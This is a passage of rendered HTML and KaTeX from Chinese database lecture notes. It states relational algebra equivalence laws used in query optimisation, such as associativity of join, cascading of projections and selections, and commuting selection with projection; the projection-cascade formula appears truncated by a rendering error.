style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>⋈</mo><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\Join E_2)\Join E_3\equiv E_1\Join (E_2\Join E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo>×</mo><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\times E_2)\times E_3\equiv E_1\times (E_2\times E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li></ul><p>并，交运算也有结合律</p><h5 id="%E5%AE%9A%E7%90%86l3%EF%BC%9A%E6%8A%95%E5%BD%B1%E4%B8%B2%E6%8E%A5%E7%8E%87" tabindex="-1">定理L3：投影串接率</h5><p a_1,..a_n>设属性集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><mo>⊆</mo><mrow><msub><mi>B</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></mrow><annotation encoding="application/x-tex">{A_1,..A_n}\subseteq {B_1..B_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是表达式，则有：<br><section><eqn><span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#x27;_&#x27; at position 46: …}(E))\equiv \pi_̲" style="color:#cc0000">\pi_{A_1,..A_n}(\pi_{B_1,..B_m}(E))\equiv \pi_</span></eqn></section></p><ul><li>此定理可以双向使用<ul><li>正向可以将两遍扫描变为一边扫描</li><li>逆向可以将属性扩展便于投影操作的移动</li></ul></li></ul><h5 id="%E5%AE%9A%E7%90%86l4%EF%BC%9A%E9%80%89%E6%8B%A9%E7%9A%84%E4%B8%B2%E6%8E%A5%E7%8E%87" tabindex="-1">定理L4：选择的串接率</h5><p>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是关系代数表达式，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_1,F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是条件，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F1}(\sigma_{F2}(E))\equiv \sigma_{F_1\wedge F_2}(E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span></span></eqn></section></p><ul><li>此定理可以双向使用<ul><li>正向可以将两遍扫描变为一边扫描</li><li>逆向可以将属性扩展便于选择操作的移动</li></ul></li></ul><h5 id="%E5%AE%9A%E7%90%86l5%EF%BC%9A%E9%80%89%E6%8B%A9%E5%92%8C%E6%8A%95%E5%BD%B1%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L5：选择和投影的交换律</h5><p>设条件F只涉及属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">{A_1...A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>是关系表达式，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(\sigma_{F}(E))\equiv\sigma_F(\pi_{A_1..A_n}(E))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span></span></span></span></span></eqn></section><br>更一般地，若<eq><span class="katex"><span class="katex-mathml"><math 